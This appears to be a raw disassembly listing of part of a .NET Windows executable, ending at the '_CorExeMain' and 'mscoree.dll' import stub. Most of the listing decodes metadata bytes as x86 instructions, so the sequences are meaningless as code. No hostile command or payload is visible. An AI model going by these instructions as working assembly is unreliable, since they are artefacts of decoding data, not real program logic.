  40c9d1:	0e                   	push   %cs
  40c9d2:	0e                   	push   %cs
  40c9d3:	0e                   	push   %cs
  40c9d4:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c9d9:	1c 07                	sbb    $0x7,%al
  40c9db:	00 01                	add    %al,(%ecx)
  40c9dd:	12 41 12             	adc    0x12(%ecx),%al
  40c9e0:	81 81 04 07 02 0a 02 	addl   $0x6071002,0xa020704(%ecx)
  40c9e7:	10 07 06 
  40c9ea:	12 81 b5 12 81 b9    	adc    -0x467eed4b(%ecx),%al
  40c9f0:	12 81 bd 12 81 c1    	adc    -0x3e7eed43(%ecx),%al
  40c9f6:	0e                   	push   %cs
  40c9f7:	02 05 20 00 12 81    	add    0x81120020,%al
  40c9fd:	b9 05 20 00 12       	mov    $0x12002005,%ecx
  40ca02:	81 bd 05 20 00 12 81 	cmpl   $0x2004c181,0x12002005(%ebp)
  40ca09:	c1 04 20 
  40ca0c:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40ca0f:	04 07                	add    $0x7,%al
  40ca11:	02 02                	add    (%edx),%al
  40ca13:	02 03                	add    (%ebx),%al
  40ca15:	20 00                	and    %al,(%eax)
  40ca17:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40ca1a:	02 18                	add    (%eax),%bl
  40ca1c:	02 09                	add    (%ecx),%cl
  40ca1e:	07                   	pop    %es
  40ca1f:	04 1d                	add    $0x1d,%al
  40ca21:	12 41 08             	adc    0x8(%ecx),%al
  40ca24:	12 41 0e             	adc    0xe(%ecx),%al
  40ca27:	0a 07                	or     (%edi),%al
  40ca29:	04 12                	add    $0x12,%al
  40ca2b:	81 b5 08 12 81 b9 0e 	xorl   $0x1100c0e,-0x467eedf8(%ebp)
  40ca32:	0c 10 01 
  40ca35:	01 15 12 81 d1 01    	add    %edx,0x1d18112
  40ca3b:	1e                   	push   %ds
  40ca3c:	00 12                	add    %dl,(%edx)
  40ca3e:	35 05 0a 01 12       	xor    $0x12010a05,%eax
  40ca43:	81 c1 0c 10 01 01    	add    $0x101100c,%ecx
  40ca49:	1e                   	push   %ds
  40ca4a:	00 15 12 81 d1 01    	add    %dl,0x1d18112
  40ca50:	1e                   	push   %ds
  40ca51:	00 03                	add    %al,(%ebx)
  40ca53:	07                   	pop    %es
  40ca54:	01 0e                	add    %ecx,(%esi)
  40ca56:	05 00 00 12 81       	add    $0x81120000,%eax
  40ca5b:	d5 05                	aad    $0x5
  40ca5d:	00 01                	add    %al,(%ecx)
  40ca5f:	0e                   	push   %cs
  40ca60:	1d 1c 0b 07 05       	sbb    $0x5070b1c,%eax
  40ca65:	1d 05 12 81 3d       	sbb    $0x3d811205,%eax
  40ca6a:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40ca6f:	20 02                	and    %al,(%edx)
  40ca71:	0e                   	push   %cs
  40ca72:	08 08                	or     %cl,(%eax)
  40ca74:	06                   	push   %es
  40ca75:	07                   	pop    %es
  40ca76:	02 02                	add    (%edx),%al
  40ca78:	11 81 55 05 20 02    	adc    %eax,0x2200555(%ecx)
  40ca7e:	0e                   	push   %cs
  40ca7f:	0e                   	push   %cs
  40ca80:	0e                   	push   %cs
  40ca81:	05 20 00 11 81       	add    $0x81110020,%eax
  40ca86:	55                   	push   %ebp
  40ca87:	05 00 00 12 81       	add    $0x81120000,%eax
  40ca8c:	e5 06                	in     $0x6,%eax
  40ca8e:	20 01                	and    %al,(%ecx)
  40ca90:	01 12                	add    %edx,(%edx)
  40ca92:	81 e5 06 20 01 02    	and    $0x2012006,%ebp
  40ca98:	11 81 ed 11 07 05    	adc    %eax,0x50711ed(%ecx)
  40ca9e:	12 81 b5 15 12 31    	adc    0x311215b5(%ecx),%al
  40caa4:	01 0e                	add    %ecx,(%esi)
  40caa6:	12 81 bd 12 81 c1    	adc    -0x3e7eed43(%ecx),%al
  40caac:	0e                   	push   %cs
  40caad:	05 15 12 31 01       	add    $0x1311215,%eax
  40cab2:	0e                   	push   %cs
  40cab3:	05 20 00 1d 13       	add    $0x131d0020,%eax
  40cab8:	00 06                	add    %al,(%esi)
  40caba:	00 02                	add    %al,(%edx)
  40cabc:	0e                   	push   %cs
  40cabd:	0e                   	push   %cs
  40cabe:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40cac3:	1d 12 45 08 12       	sbb    $0x12084512,%eax
  40cac8:	45                   	inc    %ebp
  40cac9:	05 00 00 1d 12       	add    $0x121d0000,%eax
  40cace:	45                   	inc    %ebp
  40cacf:	05 20 00 11 81       	add    $0x81110020,%eax
  40cad4:	f1                   	int1
  40cad5:	09 00                	or     %eax,(%eax)
  40cad7:	02 02                	add    (%edx),%al
  40cad9:	11 81 f1 11 81 f1    	adc    %eax,-0xe7eee0f(%ecx)
  40cadf:	07                   	pop    %es
  40cae0:	20 03                	and    %al,(%ebx)
  40cae2:	01 02                	add    %eax,(%edx)
  40cae4:	0e                   	push   %cs
  40cae5:	10 02                	adc    %al,(%edx)
  40cae7:	06                   	push   %es
  40cae8:	00 01                	add    %al,(%ecx)
  40caea:	01 12                	add    %edx,(%edx)
  40caec:	81 f9 06 07 02 12    	cmp    $0x12020706,%ecx
  40caf2:	81 85 02 08 20 03 01 	addl   $0x111c0e01,0x3200802(%ebp)
  40caf9:	0e 1c 11 
  40cafc:	82 01 06             	addb   $0x6,(%ecx)
  40caff:	07                   	pop    %es
  40cb00:	02 12                	add    (%edx),%dl
  40cb02:	81 85 0e 06 20 01 12 	addl   $0xe858112,0x120060e(%ebp)
  40cb09:	81 85 0e 
  40cb0c:	07                   	pop    %es
  40cb0d:	20 02                	and    %al,(%edx)
  40cb0f:	12 81 85 0e 02 12    	adc    0x12020e85(%ecx),%al
  40cb15:	07                   	pop    %es
  40cb16:	06                   	push   %es
  40cb17:	12 20                	adc    (%eax),%ah
  40cb19:	0e                   	push   %cs
  40cb1a:	08 12                	or     %dl,(%edx)
  40cb1c:	80 c9 15             	or     $0x15,%cl
  40cb1f:	11 81 41 01 12 20    	adc    %eax,0x20120141(%ecx)
  40cb25:	12 20                	adc    (%eax),%ah
  40cb27:	10 10                	adc    %dl,(%eax)
  40cb29:	01 01                	add    %eax,(%ecx)
  40cb2b:	15 12 31 01 1e       	adc    $0x1e013112,%eax
  40cb30:	00 15 12 81 d1 01    	add    %dl,0x1d18112
  40cb36:	1e                   	push   %ds
  40cb37:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40cb3a:	01 12                	add    %edx,(%edx)
  40cb3c:	20 05 20 01 02 13    	and    %al,0x13020120
  40cb42:	00 03                	add    %al,(%ebx)
  40cb44:	07                   	pop    %es
  40cb45:	01 1c 05 00 00 12 82 	add    %ebx,-0x7dee0000(,%eax,1)
  40cb4c:	05 07 20 01 12       	add    $0x12012007,%eax
  40cb51:	82 09 1d             	orb    $0x1d,(%ecx)
  40cb54:	05 06 20 01 12       	add    $0x12012006,%eax
  40cb59:	82 0d 0e 06 00 01 1c 	orb    $0x1c,0x100060e
  40cb60:	12 82 0d 08 00 01    	adc    0x100080d(%edx),%al
  40cb66:	12 82 0d 11 82 15    	adc    0x1582110d(%edx),%al
  40cb6c:	09 00                	or     %eax,(%eax)
  40cb6e:	02 12                	add    (%edx),%dl
  40cb70:	82 19 11             	sbbb   $0x11,(%ecx)
  40cb73:	82 1d 0e 1c 00 05 12 	sbbb   $0x12,0x5001c0e
  40cb7a:	82 25 11 82 29 0e 15 	andb   $0x15,0xe298211
  40cb81:	12 81 d1 01 12 82    	adc    -0x7dedfe2f(%ecx),%al
  40cb87:	0d 12 82 0d 15       	or     $0x150d8212,%eax
  40cb8c:	12 81 d1 01 12 82    	adc    -0x7dedfe2f(%ecx),%al
  40cb92:	19 17                	sbb    %edx,(%edi)
  40cb94:	15 12 55 01 15       	adc    $0x15015512,%eax
  40cb99:	12 59 0a             	adc    0xa(%ecx),%bl
  40cb9c:	12 5d 1c             	adc    0x1c(%ebp),%bl
  40cb9f:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40cba5:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40cbaa:	0e                   	push   %cs
  40cbab:	0b 00                	or     (%eax),%eax
  40cbad:	01 15 12 55 01 13    	add    %edx,0x13015512
  40cbb3:	00 12                	add    %dl,(%edx)
  40cbb5:	82 25 03 06 13 00 13 	andb   $0x13,0x130603
  40cbbc:	15 12 59 0a 12       	adc    $0x120a5912,%eax
  40cbc1:	5d                   	pop    %ebp
  40cbc2:	1c 12                	sbb    $0x12,%al
  40cbc4:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40cbc9:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40cbce:	0e                   	push   %cs
  40cbcf:	17                   	pop    %ss
  40cbd0:	20 0a                	and    %cl,(%edx)
  40cbd2:	01 13                	add    %edx,(%ebx)
  40cbd4:	00 13                	add    %dl,(%ebx)
  40cbd6:	01 13                	add    %edx,(%ebx)
  40cbd8:	02 13                	add    (%ebx),%dl
  40cbda:	03 13                	add    (%ebx),%edx
  40cbdc:	04 13                	add    $0x13,%al
  40cbde:	05 13 06 13 07       	add    $0x7130613,%eax
  40cbe3:	13 08                	adc    (%eax),%ecx
  40cbe5:	13 09                	adc    (%ecx),%ecx
  40cbe7:	05 07 01 12 82       	add    $0x82120107,%eax
  40cbec:	2d 07 20 03 01       	sub    $0x1032007,%eax
  40cbf1:	0e                   	push   %cs
  40cbf2:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cbf7:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40cbfd:	06                   	push   %es
  40cbfe:	12 81 2d 12 82 39    	adc    0x3982122d(%ecx),%al
  40cc04:	12 82 3d 12 82 41    	adc    0x4182123d(%edx),%al
  40cc0a:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40cc0f:	20 01                	and    %al,(%ecx)
  40cc11:	01 11                	add    %edx,(%ecx)
  40cc13:	82 4d 06 20          	orb    $0x20,0x6(%ebp)
  40cc17:	01 01                	add    %eax,(%ecx)
  40cc19:	11 82 51 05 20 00    	adc    %eax,0x200551(%edx)
  40cc1f:	12 82 55 0b 20 03    	adc    0x3200b55(%edx),%al
  40cc25:	01 12                	add    %edx,(%edx)
  40cc27:	39 12                	cmp    %edx,(%edx)
  40cc29:	82 55 11 82          	adcb   $0x82,0x11(%ebp)
  40cc2d:	59                   	pop    %ecx
  40cc2e:	08 20                	or     %ah,(%eax)
  40cc30:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cc36:	08 1a                	or     %bl,(%edx)
  40cc38:	07                   	pop    %es
  40cc39:	0a 12                	or     (%edx),%dl
  40cc3b:	81 2d 12 82 39 1d 05 	subl   $0x41821205,0x1d398212
  40cc42:	12 82 41 
  40cc45:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cc4a:	82 3d 1d 05 1d 05 1d 	cmpb   $0x1d,0x51d051d
  40cc51:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cc56:	12 81 71 08 12 81    	adc    -0x7eedf78f(%ecx),%al
  40cc5c:	71 08                	jno    0x40cc66
  40cc5e:	08 04 07             	or     %al,(%edi,%eax,1)
  40cc61:	02 02                	add    (%edx),%al
  40cc63:	08 0e                	or     %cl,(%esi)
  40cc65:	07                   	pop    %es
  40cc66:	06                   	push   %es
  40cc67:	1d 05 12 81 3d       	sbb    $0x3d811205,%eax
  40cc6c:	12 82 65 1d 05 08    	adc    0x8051d65(%edx),%al
  40cc72:	05 07 07 02 12       	add    $0x12020707,%eax
  40cc77:	82 65 1d 05          	andb   $0x5,0x1d(%ebp)
  40cc7b:	0f 07                	sysret
  40cc7d:	06                   	push   %es
  40cc7e:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40cc84:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40cc8a:	05 08 20 02 01       	add    $0x1022008,%eax
  40cc8f:	12 39                	adc    (%ecx),%bh
  40cc91:	11 82 6d 0c 07 04    	adc    %eax,0x4070c6d(%edx)
  40cc97:	12 81 2d 1d 05 12    	adc    0x12051d2d(%ecx),%al
  40cc9d:	82 69 1d 05          	subb   $0x5,0x1d(%ecx)
  40cca1:	00 00                	add    %al,(%eax)
  40cca3:	00 cc                	add    %cl,%ah
  40cca5:	cc                   	int3
	...
  40ccae:	00 00                	add    %al,(%eax)
  40ccb0:	ee                   	out    %al,(%dx)
  40ccb1:	cc                   	int3
  40ccb2:	00 00                	add    %al,(%eax)
  40ccb4:	00 20                	add    %ah,(%eax)
	...
  40ccca:	00 00                	add    %al,(%eax)
  40cccc:	e0 cc                	loopne 0x40cc9a
	...
  40cce2:	5f                   	pop    %edi
  40cce3:	43                   	inc    %ebx
  40cce4:	6f                   	outsl  %ds:(%esi),(%dx)
  40cce5:	72 45                	jb     0x40cd2c
  40cce7:	78 65                	js     0x40cd4e
  40cce9:	4d                   	dec    %ebp
  40ccea:	61                   	popa
  40cceb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40ccf2:	72 65                	jb     0x40cd59
  40ccf4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40ccf8:	6c                   	insb   (%dx),%es:(%edi)
  40ccf9:	00 00                	add    %al,(%eax)
  40ccfb:	00 00                	add    %al,(%eax)
  40ccfd:	00 ff                	add    %bh,%bh
  40ccff:	25 00 20 40 00       	and    $0x402000,%eax
